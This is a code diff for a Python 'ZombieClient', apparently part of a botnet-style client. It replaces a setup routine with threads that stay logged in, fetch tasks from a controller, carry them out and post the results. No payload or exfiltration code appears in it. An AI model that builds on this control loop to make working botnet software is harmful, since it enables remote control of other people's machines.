@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 # r3nt0n
 
-import socket, datetime
+import threading
 
 from time import sleep
 
@@ -12,7 +12,7 @@ from app.components import token, config, logger, machine, task_manager
 
 class ZombieClient:
     def __init__(self):
-        # zombie has no will of its own, everything is initiated from the brain (main.py component)
+        logger.log('zombie is waking up...', 'INFO')
         pass
 
     def keep_logged_in(self):
@@ -27,26 +27,32 @@ class ZombieClient:
     def post_completed_tasks(self):
         task_manager.post_completed_tasks()
 
-
-    def autosetup(self):
-        if not config.load_credentials():
-            while not token.create_user():
-                sleep(config.read_setting('inet_unreach_retry'))
-            logger.log('default settings loaded', 'WARNING')
-            config.write_credentials()
-
-        if not config.load_settings():
-            # default settings were loaded
-            config.write_settings()
-            logger.log('new settings writed', 'WARNING')
-        logger.log('settings and credentials loaded', 'SUCCESS')
-        return True
-
     def run(self):
-        #while True:
-        if self.autosetup():
+        if config.autosetup():
             while not token.login():
                 sleep(config.read_setting('inet_unreach_retry'))
-            return True
+
+            threads=[]
+
+            thread_keep_logged_in = threading.Thread(name='keep_logged_in', target=self.keep_logged_in)#, args=((zombie,)))
+            threads.append(thread_keep_logged_in)
+
+            thread_get_new_tasks = threading.Thread(name='get_new_tasks', target=self.get_new_tasks)#, args=((zombie,)))
+            threads.append(thread_get_new_tasks)
+
+            thread_keep_doing_new_tasks = threading.Thread(name='keep_doing_new_tasks', target=self.keep_doing_new_tasks)#,args=((zombie,)))
+            threads.append(thread_keep_doing_new_tasks)
+
+            thread_post_completed_tasks = threading.Thread(name='post_completed_tasks', target=self.post_completed_tasks)#,args=((zombie,)))
+            threads.append(thread_post_completed_tasks)
+
+            # Start all threads
+            for t in threads:
+                # t.setDaemon(True)
+                t.start()
+
+            # Wait for all of them to finish
+            for t in threads:
+                t.join()
 
 
